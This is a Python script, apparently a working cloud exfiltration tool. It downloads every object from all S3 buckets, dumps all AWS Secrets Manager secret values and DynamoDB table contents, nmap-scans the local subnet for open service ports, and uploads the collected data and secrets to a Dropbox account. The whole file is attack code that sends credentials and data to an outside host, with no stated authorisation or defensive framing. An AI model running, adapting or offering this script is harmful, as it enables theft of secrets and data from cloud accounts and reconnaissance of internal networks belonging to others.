import os
import dropbox
import configparser
import boto3
from botocore.exceptions import ClientError
import json
import psutil
import ipaddress
import nmap  # Requires: pip install python-nmap

# Directories
LOCAL_DOWNLOAD_DIR = 'upload'
os.makedirs(LOCAL_DOWNLOAD_DIR, exist_ok=True)

# Load configuration
config = configparser.ConfigParser()
config.read('config.ini')

try:
    AWS_REGION = config['aws']['region']
except KeyError:
    raise SystemExit("❌ AWS region not found in config.ini under [aws] section.")

try:
    DROPBOX_ACCESS_TOKEN = config['dropbox']['access_token']
except KeyError:
    raise SystemExit("❌ Dropbox access token not found in config.ini under [dropbox] section.")

# ------------------- AWS & Dropbox Functions -------------------

def download_from_s3(local_dir):
    s3 = boto3.client('s3', region_name=AWS_REGION)
    try:
        response = s3.list_buckets()
        buckets = [bucket['Name'] for bucket in response['Buckets']]
    except ClientError as e:
        print(f"❌ Failed to list S3 buckets: {e}")
        return

    print(f"🪣 Found {len(buckets)} buckets.")

    for bucket in buckets:
        print(f"\n📂 Accessing bucket: {bucket}")
        try:
            objects = s3.list_objects_v2(Bucket=bucket)
            if 'Contents' not in objects:
                print(f"   (Empty or no access to list contents.)")
                continue

            for obj in objects['Contents']:
                key = obj['Key']
                local_path = os.path.join(local_dir, os.path.basename(key))
                try:
                    print(f"   ⬇ Downloading {key} -> {local_path}")
                    s3.download_file(bucket, key, local_path)
                except ClientError as download_err:
                    print(f"   ❌ Failed to download {key}: {download_err}")

        except ClientError as list_err:
            print(f"   ❌ Cannot list objects in {bucket}: {list_err}")

def list_and_save_secrets(local_dir):
    secrets_client = boto3.client('secretsmanager', region_name=AWS_REGION)
    secrets_file_path = os.path.join(local_dir, 'secrets.txt')

    try:
        paginator = secrets_client.get_paginator('list_secrets')
        with open(secrets_file_path, 'w') as f:
            for page in paginator.paginate():
                for secret in page.get('SecretList', []):
                    secret_name = secret['Name']
                    try:
                        get_secret_value_response = secrets_client.get_secret_value(SecretId=secret_name)
                        secret_value = get_secret_value_response.get('SecretString', '')

                        try:
                            secret_value_parsed = json.loads(secret_value)
                            secret_value = json.dumps(secret_value_parsed, indent=2)
                        except (ValueError, TypeError):
                            pass

                        f.write(f"Secret Name: {secret_name}\n")
                        f.write(f"Secret Value: {secret_value}\n")
                        f.write("=" * 50 + "\n")
                        print(f"🔑 Saved secret: {secret_name}")

                    except ClientError as secret_err:
                        print(f"❌ Failed to retrieve secret {secret_name}: {secret_err}")
    except ClientError as e:
        print(f"❌ Failed to list secrets: {e}")

def list_and_save_dynamo_tables(local_dir):
    dynamodb = boto3.client('dynamodb', region_name=AWS_REGION)
    dynamo_file_path = os.path.join(local_dir, 'dynamodb_data.txt')

    try:
        table_list = dynamodb.list_tables().get('TableNames', [])
        with open(dynamo_file_path, 'w') as f:
            for table_name in table_list:
                f.write(f"Table: {table_name}\n")
                print(f"📄 Fetching data from DynamoDB table: {table_name}")

                try:
                    paginator = dynamodb.get_paginator('scan')
                    for page in paginator.paginate(TableName=table_name):
                        for item in page.get('Items', []):
                            json_item = json.dumps(item, indent=2)
                            f.write(json_item + "\n")
                    f.write("=" * 50 + "\n")
                except ClientError as scan_err:
                    print(f"❌ Failed to scan table {table_name}: {scan_err}")
    except ClientError as e:
        print(f"❌ Failed to list DynamoDB tables: {e}")

def upload_to_dropbox(local_dir):
    dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)
    for root, dirs, files in os.walk(local_dir):
        for filename in files:
            local_path = os.path.join(root, filename)
            dropbox_path = '/' + filename
            with open(local_path, 'rb') as f:
                print(f"Uploading {local_path} to Dropbox at {dropbox_path}...")
                dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode.add)
    print("✅ All files uploaded.")

# ------------------- New Nmap Function -------------------

def get_local_subnet():
    """Detect local subnet from active network interface."""
    for iface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family.name == "AF_INET" and not addr.address.startswith("127."):
                ip = addr.address
                netmask = addr.netmask
                network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                return str(network)
    raise RuntimeError("No active network interface found.")

def scan_network_with_nmap(local_dir):
    """Scan local subnet with Nmap and save results."""
    EXTENDED_PORTS = (
        "20-21,22,23,25,53,67-69,80,110,123,137-139,143,"
        "161-162,389,443,445,465,514,587,636,873,993,995,1080,"
        "1433,1521,2049,2082-2083,2483-2484,3000,3306,3389,5432,"
        "5900,6379,8080,8443,9000,9200,10000"
    )

    subnet = get_local_subnet()
    print(f"🌐 Detected subnet: {subnet}")

    scanner = nmap.PortScanner()
    scanner.scan(hosts=subnet, ports=EXTENDED_PORTS, arguments="-T4 -Pn")

    nmap_file_path = os.path.join(local_dir, 'nmap_results.txt')
    with open(nmap_file_path, 'w') as f:
        for host in scanner.all_hosts():
            f.write(f"Host: {host} ({scanner[host].hostname()})\n")
            f.write(f"State: {scanner[host].state()}\n")
            for proto in scanner[host].all_protocols():
                ports = scanner[host][proto].keys()
                for port in sorted(ports):
                    state = scanner[host][proto][port]['state']
                    if state == "open":
                        f.write(f"  Port {port}/{proto} - OPEN\n")
            f.write("\n")
    print(f"✅ Nmap results saved to {nmap_file_path}")

# ------------------- Main -------------------

if __name__ == "__main__":
    download_from_s3(LOCAL_DOWNLOAD_DIR)
    list_and_save_secrets(LOCAL_DOWNLOAD_DIR)
    list_and_save_dynamo_tables(LOCAL_DOWNLOAD_DIR)
    scan_network_with_nmap(LOCAL_DOWNLOAD_DIR)
    upload_to_dropbox(LOCAL_DOWNLOAD_DIR)
